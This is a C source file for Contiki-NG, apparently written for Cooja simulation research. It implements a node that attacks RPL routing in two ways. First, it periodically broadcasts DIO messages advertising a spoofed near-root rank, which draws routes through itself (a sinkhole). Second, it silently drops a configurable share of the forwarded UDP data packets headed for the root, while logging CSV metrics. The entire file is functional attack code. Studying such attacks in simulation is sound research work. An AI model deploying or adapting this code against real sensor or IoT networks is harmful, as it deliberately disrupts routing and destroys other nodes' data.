/*
 * sinkhole_drop_attacker.c
 * Combined Sinkhole + Selective Forwarding attacker for Contiki-NG / Cooja
 *
 * Threat model (Phase 2 — Availability Degradation):
 *   - Joins the DODAG normally
 *   - After ATTACK_WARMUP_SECONDS:
 *       (a) Periodically emits fake low-rank DIOs to capture routes (sinkhole)
 *       (b) Drops ATTACK_DROP_PCT % of forwarded UDP data packets toward root
 *   - Control-plane packets (DIO/DAO/DIS) are always forwarded
 *
 * CSV output:
 *   CSV,PROTOCOL,<id>,SINKHOLE_DROP
 *   CSV,LLADDR,<id>,<hex>
 *   CSV,ATTACK_PARAMS,<id>,mode=sinkhole_drop,warmup=<s>,rank_delta=<d>,drop_pct=<p>
 *   CSV,ATTACK_ENABLED,<id>
 *   CSV,SINKHOLE_DIO,<id>,<count>,<spoofed_rank>
 *   CSV,FWD,<id>,<total>,<udp_to_root>,<dropped>
 *   CSV,PARENT,<id>,<ip|none>
 *   CSV,ROUTING,<id>,<joined>,<parent_ip>,<rank>
 */

#include "contiki.h"
#include "sys/log.h"
#include "net/netstack.h"
#include "net/ipv6/uip.h"
#include "net/ipv6/uipbuf.h"
#include "net/ipv6/uip-ds6.h"
#include "net/ipv6/uiplib.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-classic/rpl.h"
#include "net/routing/rpl-classic/rpl-private.h"
#include "random.h"

#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define LOG_MODULE "SINK_DROP"
#define LOG_LEVEL  LOG_LEVEL_WARN

#define UDP_PORT 8765

#ifndef ATTACK_WARMUP_SECONDS
#define ATTACK_WARMUP_SECONDS 350
#endif

#ifndef SINKHOLE_DIO_PERIOD_SECONDS
#define SINKHOLE_DIO_PERIOD_SECONDS 15
#endif

#define SINKHOLE_DIO_PERIOD ((clock_time_t)SINKHOLE_DIO_PERIOD_SECONDS * CLOCK_SECOND)

#ifndef SINKHOLE_RANK_DELTA
#define SINKHOLE_RANK_DELTA 1
#endif

#ifndef ATTACK_DROP_PCT
#define ATTACK_DROP_PCT 50
#endif

static uip_ipaddr_t root_ipaddr;
static uint8_t  attack_enabled;
static uint32_t fwd_total;
static uint32_t fwd_udp_root;
static uint32_t fwd_dropped;
static uint32_t dio_count;

void
brpl_parent_switch_callback(rpl_parent_t *old_p, rpl_parent_t *new_p)
{
  (void)old_p;
  (void)new_p;
}

static void
log_preferred_parent(void)
{
  rpl_dag_t *dag = rpl_get_any_dag();
  unsigned id = (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1];
  if(dag == NULL || dag->preferred_parent == NULL) {
    printf("CSV,PARENT,%u,none\n", id);
    return;
  }
  const uip_ipaddr_t *paddr = rpl_parent_get_ipaddr(dag->preferred_parent);
  printf("CSV,PARENT,%u,", id);
  if(paddr != NULL) {
    uiplib_ipaddr_print(paddr);
  } else {
    printf("unknown");
  }
  printf("\n");
}

static void
log_routing_status(void)
{
  rpl_dag_t *dag = rpl_get_any_dag();
  unsigned id     = (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1];
  unsigned joined = NETSTACK_ROUTING.node_has_joined() ? 1 : 0;
  printf("CSV,ROUTING,%u,%u,", id, joined);
  if(dag != NULL && dag->preferred_parent != NULL) {
    const uip_ipaddr_t *paddr = rpl_parent_get_ipaddr(dag->preferred_parent);
    if(paddr != NULL) {
      uiplib_ipaddr_print(paddr);
      printf(",%u\n", (unsigned)dag->rank);
      return;
    }
  }
  printf("none,0\n");
}

static uint8_t
should_drop(void)
{
  if(ATTACK_DROP_PCT == 0)   return 0;
  if(ATTACK_DROP_PCT >= 100) return 1;
  return (random_rand() % 100) < (uint8_t)ATTACK_DROP_PCT;
}

static uint8_t
is_forwarded_udp_to_root(void)
{
  if(uip_ds6_is_my_addr(&UIP_IP_BUF->srcipaddr)) {
    return 0;
  }
  uint8_t proto = 0;
  uipbuf_get_last_header(uip_buf, uip_len, &proto);
  if(proto != UIP_PROTO_UDP) {
    return 0;
  }
  if(UIP_UDP_BUF->destport != UIP_HTONS(UDP_PORT)) {
    return 0;
  }
  return uip_ipaddr_cmp(&UIP_IP_BUF->destipaddr, &root_ipaddr);
}

static enum netstack_ip_action
ip_output_hook(const linkaddr_t *localdest)
{
  (void)localdest;

  if(!attack_enabled) {
    return NETSTACK_IP_PROCESS;
  }

  if(!uip_ds6_is_my_addr(&UIP_IP_BUF->srcipaddr)) {
    fwd_total++;
  }

  if(is_forwarded_udp_to_root()) {
    fwd_udp_root++;
    if(should_drop()) {
      fwd_dropped++;
      return NETSTACK_IP_DROP;
    }
  }

  return NETSTACK_IP_PROCESS;
}

static struct netstack_ip_packet_processor pkt_proc = {
  .process_input  = NULL,
  .process_output = ip_output_hook
};

static void
emit_sinkhole_dio(void)
{
  rpl_instance_t *instance = rpl_get_default_instance();
  rpl_dag_t *dag;
  rpl_rank_t saved_rank;

  if(instance == NULL || instance->current_dag == NULL) {
    return;
  }

  dag = instance->current_dag;
  saved_rank = dag->rank;
  dag->rank  = (rpl_rank_t)(ROOT_RANK(instance) + SINKHOLE_RANK_DELTA);

  dio_output(instance, NULL);

  dag->rank = saved_rank;

  dio_count++;
  printf("CSV,SINKHOLE_DIO,%u,%lu,%u\n",
         (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1],
         (unsigned long)dio_count,
         (unsigned)(ROOT_RANK(instance) + SINKHOLE_RANK_DELTA));
}

PROCESS(sinkhole_drop_process, "Sinkhole+Drop attacker");
AUTOSTART_PROCESSES(&sinkhole_drop_process);

PROCESS_THREAD(sinkhole_drop_process, ev, data)
{
  static struct etimer attack_timer;
  static struct etimer dis_timer;
  static struct etimer dio_timer;
  static struct etimer status_timer;

  (void)ev; (void)data;

  PROCESS_BEGIN();

  uip_ip6addr(&root_ipaddr, 0xaaaa, 0, 0, 0, 0, 0, 0, 1);
  attack_enabled = 0;
  fwd_total = 0;
  fwd_udp_root = 0;
  fwd_dropped = 0;
  dio_count = 0;

  {
    unsigned id = (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1];
    uint8_t i;
    printf("CSV,PROTOCOL,%u,SINKHOLE_DROP\n", id);
    printf("CSV,LLADDR,%u,", id);
    for(i = 0; i < LINKADDR_SIZE; i++) {
      printf("%02x", linkaddr_node_addr.u8[i]);
      if(i + 1 < LINKADDR_SIZE) printf(":");
    }
    printf("\n");
    printf("CSV,ATTACK_PARAMS,%u,mode=sinkhole_drop,warmup=%u,rank_delta=%u,drop_pct=%u,dio_period=%u\n",
           id,
           (unsigned)ATTACK_WARMUP_SECONDS,
           (unsigned)SINKHOLE_RANK_DELTA,
           (unsigned)ATTACK_DROP_PCT,
           (unsigned)SINKHOLE_DIO_PERIOD_SECONDS);
  }

  netstack_ip_packet_processor_add(&pkt_proc);

  etimer_set(&attack_timer, (clock_time_t)ATTACK_WARMUP_SECONDS * CLOCK_SECOND);
  etimer_set(&dis_timer,    30 * CLOCK_SECOND);
  etimer_set(&status_timer, 30 * CLOCK_SECOND);

  while(1) {
    PROCESS_WAIT_EVENT();

    if(!attack_enabled && etimer_expired(&attack_timer)) {
      attack_enabled = 1;
      printf("CSV,ATTACK_ENABLED,%u\n",
             (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1]);
      etimer_set(&dio_timer, CLOCK_SECOND);
    }

    if(etimer_expired(&dis_timer)) {
      if(!NETSTACK_ROUTING.node_has_joined()) {
        dis_output(NULL);
      }
      etimer_reset(&dis_timer);
    }

    if(attack_enabled && etimer_expired(&dio_timer)) {
      if(NETSTACK_ROUTING.node_has_joined()) {
        emit_sinkhole_dio();
      }
      etimer_reset_with_new_interval(&dio_timer, SINKHOLE_DIO_PERIOD);
    }

    if(etimer_expired(&status_timer)) {
      unsigned id = (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1];
      log_preferred_parent();
      log_routing_status();
      printf("CSV,FWD,%u,%lu,%lu,%lu\n",
             id,
             (unsigned long)fwd_total,
             (unsigned long)fwd_udp_root,
             (unsigned long)fwd_dropped);
      etimer_reset(&status_timer);
    }
  }

  PROCESS_END();
}
